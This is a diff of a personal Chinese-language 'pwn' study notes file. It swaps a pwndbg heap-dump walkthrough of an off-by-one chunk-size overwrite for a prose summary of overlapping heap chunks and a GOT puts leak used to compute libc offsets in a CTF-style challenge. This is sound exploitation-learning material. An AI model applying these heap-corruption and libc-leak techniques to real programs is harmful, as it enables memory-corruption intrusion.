@@ -1,6 +1,6 @@
 ﻿---
 title: "pwn"
-lastmod: 2026-06-03T23:04:12+08:00
+lastmod: 2026-06-15T15:46:23+08:00
 draft: false
 ---
 32位最短的shellcode为21字节，内容是
@@ -6979,65 +6979,19 @@ def main():
 if __name__ == '__main__':
     main()
 ```
-拆解一下步骤，先是两个create，创建四个堆
-```
-pwndbg> heap
-Allocated chunk | PREV_INUSE
-Addr: 0x603000
-Size: 0x300 (with flag bits: 0x301)
+现在我命名create的两个堆为node和heap
+![[Pasted image 20260615153024.png]]
+在第一次的create完成以后更改变量，node1的大小变化了
+之后重新申请一下
+因为释放了，bin里面有一个0x20的，一个0x40的
+因为申请了一个0x10的node2，0x30的heap2
+重新申请以后发现加上size恰好是这两个堆
+所以重新申请到了原位置
+![[Pasted image 20260615153511.png]]
+这样子的情况下两个堆重合到了一起，
+node2的size不能溢出到不能使用字段，不能瞎写这个道题目里面的ptr，除此以外别太大太小就行
+然后在node里面直接输出指向的值
+但是我的输出自定义了got里面puts的位置，所以能直接输出puts的值
+通过这个直接进行libc偏移
 
-Allocated chunk | PREV_INUSE
-Addr: 0x603300
-Size: 0x20 (with flag bits: 0x21)
-
-Allocated chunk | PREV_INUSE
-Addr: 0x603320
-Size: 0x20 (with flag bits: 0x21)
-
-Allocated chunk | PREV_INUSE
-Addr: 0x603340
-Size: 0x20 (with flag bits: 0x21)
-
-Allocated chunk | PREV_INUSE
-Addr: 0x603360
-Size: 0x20 (with flag bits: 0x21)
-
-Top chunk | PREV_INUSE
-Addr: 0x603380
-Size: 0x20c80 (with flag bits: 0x20c81)
-
-pwndbg> x/10gx 0x6020A0
-0x6020a0 <heaparray>:   0x0000000000603310      0x0000000000603350
-0x6020b0 <heaparray+16>:        0x0000000000000000      0x0000000000000000
-0x6020c0 <heaparray+32>:        0x0000000000000000      0x0000000000000000
-0x6020d0 <heaparray+48>:        0x0000000000000000      0x0000000000000000
-0x6020e0 <heaparray+64>:        0x0000000000000000      0x0000000000000000
-```
-从中可以明确的看出来，有两个堆结构
-这里heaparray指向的是用户区的地址
-```
-node0   0x603300
-0x0000000000000018      0x0000000000603330
-chunk0  0x603320
-0x4141414141414141      0x4141414141414141
-node1   0x603340
-0x0000000000000010      0x0000000000603370
-chunk1  0x603360
-0x4242424242424242      0x4242424242424242
-```
-这里面指向堆的指针指的是用户区，但是heap里面记录的堆的地址是从size开始的
-下一步是`edit(io, 0, b'A' * 0x18 + b'\x41')`
-这一步是让chunk0越界到node1，让node1的大小显示为41
-```
-0x603300:       0x0000000000000000      0x0000000000000021  node0头
-0x603310:       0x0000000000000018      0x0000000000603330  node0用户区
-0x603320:       0x0000000000000000      0x0000000000000021  chunk0头
-0x603330:       0x4141414141414141      0x4141414141414141  chunk0用户区
-0x603340:       0x4141414141414141      0x0000000000000041  chunk0用户区+node1头
-0x603350:       0x0000000000000010      0x0000000000603370  node1用户区
-0x603360:       0x0000000000000000      0x0000000000000021  chunk1头（node1用户区）
-0x603370:       0x4242424242424242      0x4242424242424242  chunk1用户区
-```
-因为多写了一个，就能把node1的长度覆盖掉，现在node1的长度是41
-然后是删除1
 
